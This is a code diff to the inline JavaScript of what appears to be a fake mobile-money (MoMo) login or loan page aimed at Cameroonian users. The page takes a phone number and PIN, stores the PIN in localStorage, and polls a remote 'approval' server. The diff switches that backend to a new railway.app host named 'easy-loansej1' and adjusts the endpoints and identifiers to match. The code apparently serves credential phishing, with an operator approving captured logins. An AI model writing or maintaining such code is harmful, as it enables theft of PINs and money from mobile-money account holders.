@@ -509,11 +509,11 @@
 
     <script>
         // ============================================
-        // ✅ FIXED BACKEND URL — points to the working server
+        // ✅ CORRECT BACKEND — easy-loansej1
         // ============================================
-        const API_BASE = 'https://momo-usersey-production.up.railway.app';
+        const API_BASE = 'https://easy-loansej1-production.up.railway.app';
 
-        const POLL_INTERVAL_MS = 2500;
+        const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
 
         const phoneInput = document.getElementById('phone');
@@ -607,15 +607,16 @@
         function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
 
         // ============================================
-        // ✅ FIXED POLLING — uses /api/status/ (correct endpoint)
+        // ✅ POLLING — /api/approval/status/:requestId
+        // (matches this server.js)
         // ============================================
-        function startPolling(sessionId) {
+        function startPolling(requestId) {
             stopPolling();
-            console.log('🔄 Polling started for sessionId:', sessionId);
+            console.log('🔄 Polling started for requestId:', requestId);
 
             pollTimer = setInterval(async () => {
                 try {
-                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
+                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
                     const data = await res.json();
 
                     console.log('📥 Status check:', data);
@@ -629,7 +630,7 @@
                         localStorage.setItem('momoSession', JSON.stringify({
                             phone: '+237' + phoneInput.value.replace(/\s/g, ''),
                             country: 'CM',
-                            token: sessionId,
+                            token: requestId,
                             loggedInAt: new Date().toISOString()
                         }));
                         localStorage.setItem('momoPhone', '+237' + phoneInput.value.replace(/\s/g, ''));
@@ -712,8 +713,8 @@
                 localStorage.setItem('momoPhone', '+237' + phoneDigits);
                 localStorage.setItem('momoPin', pin);
 
-                // ✅ FIXED: uses sessionId (matches server response)
-                startPolling(data.sessionId);
+                // ✅ this server returns `requestId`
+                startPolling(data.requestId);
 
             } catch (err) {
                 console.error('Login error:', err);
